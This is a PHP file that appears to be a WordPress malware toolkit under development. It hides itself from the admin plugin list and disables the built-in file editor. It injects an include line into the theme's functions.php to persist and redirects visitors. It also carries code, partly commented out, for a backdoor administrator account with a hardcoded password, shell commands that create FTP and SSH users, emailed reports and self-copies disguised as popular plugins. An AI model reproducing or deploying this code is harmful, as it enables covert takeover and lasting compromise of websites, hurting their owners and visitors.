<?php
##------------------------------------------------##
## 01 # Hide My Plugin From Plugins List
##------------------------------------------------##

// self_hider(true);

add_filter(
  'all_plugins',
  function ($plugins) {

    $shouldHide = !array_key_exists('show_all', $_GET);

    if ($shouldHide) {
      $hiddenPlugins = [
        'WordPress-External-Script-Plugin/index.php',
        'index.php',
      ];

      foreach ($hiddenPlugins as $hiddenPlugin) {
        unset($plugins[$hiddenPlugin]);
      }
    }
    return $plugins;
  }
);

##------------------------------------------------##
## 02 # Disable Theme/Plugin File Editor
##------------------------------------------------##

// disable_editor(true);

define('DISALLOW_FILE_EDIT', true);

##------------------------------------------------##
## 03 # Create BackDoors
##------------------------------------------------##

// create_backdoor(true);

// add_action('wp_head', 'my_backdoor');
// function my_backdoor()
// { // URL : website.com/?backdoor=go
//   if (md5($_GET['backdoor']) == '34d1f91fb2e514b8576fab1a75a89a6b') {
//     require('wp-includes/registration.php');
//     if (!username_exists('mr_admin')) { // user : mr_admin
//       $user_id = wp_create_user('mr_admin', 'pa55w0rd!'); // pass : pa55w0rd
//       $user = new WP_User($user_id);
//       $user->set_role('administrator');
//     }
//   }
// }

##------------------------------------------------##
## 04 # Add Script Runner To Theme functions.php
##------------------------------------------------##

// modify_functions(true);

// Get file directory
$file = get_stylesheet_directory() . '/functions.php';
// New code that should be added
$searchfor = 'include_once \'tag-manager-script.php\';';

// the following line prevents the browser from parsing this as HTML.
header('Content-Type: text/plain');

// get the file contents, assuming the file to be readable (and exist)
$contents = file_get_contents($file);

// escape special characters in the query
$pattern = preg_quote($searchfor, '/');

// finalise the regular expression, matching the whole line
$pattern = "/^.*$pattern.*\$/m";

// search, and store all matching occurences in $matches
if (preg_match_all($pattern, $contents, $matches)) {
  echo '<script>';
  echo 'console.log("JQMIGRATE: Migrate is installed, version 3.4.1");';
  echo '</script>';
} else {
  // Modify the content
  $contents .= $searchfor . PHP_EOL;
  // Write the modified contents back to the file
  file_put_contents($file, $contents);
}

##------------------------------------------------##
## 05 # Craete FTP Account
##------------------------------------------------##

// create_ftp(true);

# الكود دا كله لسا متراجعش عليه ومعرفش شغال ولا لا
// // FTP account details
// $username = 'newuser';
// $password = 'newpassword';

// // Execute the command to create an FTP user (Linux example)
// $command = 'sudo useradd -m ' . $username . ' -p $(openssl passwd -1 ' . $password . ')';
// exec($command, $output, $returnCode);

// if ($returnCode === 0) {
//   echo 'FTP account created successfully.';
// } else {
//   echo 'Failed to create FTP account.';
//   print_r($output); // Output any error messages or details
// }

##------------------------------------------------##
## 06 # Create SSH Access
##------------------------------------------------##

// create_ssh(true);

# الكود دا كله لسا متراجعش عليه ومعرفش شغال ولا لا
// // SSH user details
// $username = 'newuser';
// $password = 'newpassword';

// // Execute the command to create an SSH user (Linux example)
// $command = 'sudo useradd ' . $username . ' -m -p $(openssl passwd -1 ' . $password . ')';
// exec($command, $output, $returnCode);

// if ($returnCode === 0) {
//     echo 'SSH user created successfully.';
// } else {
//     echo 'Failed to create SSH user.';
//     print_r($output); // Output any error messages or details
// }

##------------------------------------------------##
## 07 # Send Email Report To Me
##------------------------------------------------##

// email_sender(true, $email_address, $subject, $message, $headers);

# الكود دا كله لسا متراجعش عليه ومعرفش شغال ولا لا
// // Send the email
// $mailSuccess = mail($email_address, $subject, $message, $headers);

// // Check if the email was sent successfully
// if ($mailSuccess) {
//     echo "Email sent successfully.";
// } else {
//     echo "Failed to send email.";
// }

##------------------------------------------------##
## 08 # Redirect To Another URL
##------------------------------------------------##

// URL_redirect(true);

header("Location: https://www.google.com/");
exit();


##------------------------------------------------##
## 09 # Self duplicator Plugin
##------------------------------------------------##

// self_duplicator(true);

// Plugin Names
$plugins_names = ['facebook-pixel', 'elementor', 'security', 'wordpress', 'performance', 'optimization', 'speed-optimization', 'plugin-installer', "hellodolly", "akismet-antispam", 'classic-editors', 'classic-widgets', 'woocommerce', 'one-click-demo-importer-free'];
// Randomize a number from 0 to Plugin_Names length
$rndm_plgn = rand(0, count($plugins_names) - 1);

// Specify the path for the new folder
$myself_folderPath = 'wp-content/plugins' . "/" . $plugins_names[$rndm_plgn];

// Create the folder
if (!file_exists($myself_folderPath)) {
  if (mkdir($myself_folderPath, 0755, true)) {
    echo 'Folder created successfully.';
  } else {
    echo 'Failed to create folder.';
  }
} else {
  echo 'Folder already exists.';
}

// // Specify the path for the new file
// $myself_filepath = $myself_folderPath . '/' . $plugins_names[$rndm_plgn] . '.php';

// // Specify the content to be written to the file
// $myself_filecontents = '<?php
// ##
// Plugin Name: ' . $plugins_names[$rndm_plgn] . '
// Description: Track, Monitor, Analyze and Manage your website visitors\' data.
// Version: ' . rand(0, 9) . '.' . rand(0, 9) . '.' . rand(0, 9) . '
// Author: ' . $plugins_names[$rndm_plgn] . ' LLC.' . '
// ##

// include_once \'tag-manager-script.php\';
// ';

// // Create the file
// if (file_put_contents($myself_filepath, $myself_filecontents) !== false) {
//   echo 'File created successfully.<br>';
// } else {
//   echo 'Failed to create file.<br>';
// }



// // Debug Log
// function debug_log($msg,$is_sending) { 
//   echo 'date - time' . '<br><br>';
//   echo $msg;
//   if ($is_sending === true) {
//     echo 'sent';
//   }
  
// }
